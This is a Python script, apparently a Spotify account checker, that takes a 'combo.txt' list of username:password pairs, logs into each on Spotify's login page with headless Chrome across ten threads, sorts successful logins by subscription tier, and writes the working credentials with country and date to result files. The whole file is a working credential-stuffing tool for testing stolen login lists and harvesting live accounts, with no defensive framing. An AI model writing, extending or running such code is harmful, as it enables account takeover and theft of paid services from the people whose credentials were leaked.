from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
import datetime

import time, os 

from threading import Thread, RLock

verrou = RLock()

class Spotify_checker:
    
    def __init__(self, combo, rep):
        
        self.combo = combo
        self.result_rep = rep
        #self.build_chrome_options()
        
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--headless")
        
        self.driver = webdriver.Chrome(options = self.chrome_options)

        self.result = {'Wrong' : 0, 'Other' : [0, ""],'Free' : [0, ""],'Premium' : [0, ""],'Student' : [0, ""],'Family owner' : [0, ""], 'Family member' : [0, ""]} 
        
        self.verify_combo()
        
        self.driver.quit()
        
        
    def verify_combo(self):
        
        for a in self.combo:
            
            if (self.verify_account(a[0],a[1]) == -1):
                print("Error : account {0}:{1}\n".format(a[0],a[1]))
    
    def verify_account(self, u, p):

        self.driver.get("https://accounts.spotify.com/fr/login/?continue=https:%2F%2Fwww.spotify.com%2Ffr%2Faccount%2Foverview%2F&_locale=fr-FR")
        
        wait = WebDriverWait(self.driver, 3)
        try:
            wait.until(EC.presence_of_element_located((By.ID, 'login-username')))
        except:
            self.driver.get("https://www.spotify.com/fr/logout")
            return -1
        
    
        user = self.driver.find_element_by_id("login-username")
        user.clear()
        user.send_keys(u)
        self.driver.find_element_by_id("login-password").send_keys(p)
        self.driver.find_element_by_id("login-button").click()
        
        wait = WebDriverWait(self.driver, 3)
        
        try :
            wait.until(EC.presence_of_element_located((By.ID, 'account-csr-container')))
        except:

            self.result["Wrong"] += 1
            return 0
        
        try:
            account_statut = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[2]/section[1]/div[1]/div[1]/div[1]/h2")
        except:
            print("Erreur statut du compte\n")
            self.driver.get("https://www.spotify.com/fr/logout")
            return -2
        
        if(account_statut.text == u"Spotify Free"):
            a_c = "Free"
            
            
        elif(account_statut.text == u"Spotify Premium"):
            a_c = "Premium"
            
        elif(account_statut.text == u"Spotify Étudiants"): 
            a_c = "Student"
        
        elif (account_statut.text == u"Spotify Famille"):
            try :
                t = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[2]/section[1]/div[1]/div[2]/div[1]/div[1]/div[2]/div/h3").text
                if t == u"Paiement":
                    a_c = "Family owner"  
                    
                    
            except:
                a_c = "Family member"
                
        else:
            a_c = "Other"
        
        try: 
            pos = 4
            country = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[1]/section[1]/table[1]/tbody[1]/tr[{0}]/td[2]/p".format(pos))
        except:
            pos = 3
            country = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[1]/section[1]/table[1]/tbody[1]/tr[{0}]/td[2]/p".format(pos))
        
        date = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[1]/section[1]/table[1]/tbody[1]/tr[{0}]/td[2]/p".format(pos -1))
        
        self.result[a_c][0] += 1
        self.result[a_c][1] += "{0}:{1} | {2} | {3}\n".format(u,p,country.text,date.text)
        self.save_data("{0}:{1} | {2} | {3}\n".format(u,p,country.text,date.text), a_c)
        
        self.driver.get("https://www.spotify.com/fr/logout")
        
        return 1
    
        
    def save_data(self, data, data_t):
       
        with verrou :
            with open('{0}/{1}.txt'.format(self.result_rep,data_t), 'a') as f: 
                f.write( data )
                f.close()
        

class ThreadedTask( Thread ):
    """
    Needed to run parallel tasks
    """
    def __init__(self, func, *args):
        
        Thread.__init__(self)
        self.func = func
        self.args = args
        
    def run(self):
        
        self.result_task = self.func(*self.args)
        return 1
    
    
class Main:

    def __init__(self,combo_list, thread):
        
        start_time = time.time()
        
        self.thread_nb = thread
        self.combo_list_f = combo_list
        self.load_combo()
        self.create_rep()
        
        if (self.thread_nb == 1 or len(self.combo) < 10) :
            self.Thread  = Spotify_checker(self.combo, self.result_rep)
            self.result = self.Thread.result
            
        else:
            combo_part = int(len(self.combo)/self.thread_nb)
            
            self.Thread = [ ThreadedTask(Spotify_checker, self.combo[i * combo_part : (i *combo_part) + combo_part] if i != self.thread_nb -1 else self.combo[i * combo_part : (i * combo_part) + combo_part + self.thread_nb % len(self.combo)], self.result_rep ) for i in xrange(self.thread_nb)]
            
            for t in self.Thread: 
                t.start()
            for t in self.Thread:
                t.join()
                       
            self.result = {}
            for T in self.Thread:
                for key, value in T.result_task.result.items():
                    self.result[key] = self.result[key] + value if type(value) == int and key in self.result.keys() else [self.result[key][0] + value[0], self.result[key][1] + value[1]] if key in self.result.keys() and type(value) == list else [value[0],value[1]] if type(value)==list else value  
            
        print("Exec time : %s secondes ---" % datetime.timedelta(seconds=time.time() - start_time ) )

    def load_combo(self):
        
        with open(self.combo_list_f, 'r') as f:
            
            self.combo = [ [i.split(':')[0], i.split(':')[1]] for i in f.read().split('\n') ]
    
    def create_rep(self):
        
        if not os.path.isdir('results/'):
            os.makedirs('results')
            
        self.result_rep = 'results/'+time.strftime("%Y-%m-%d %Hh%M")
        
        os.makedirs(self.result_rep)
            
                    
    
if __name__ == "__main__":
    main = Main("combo.txt", 10)
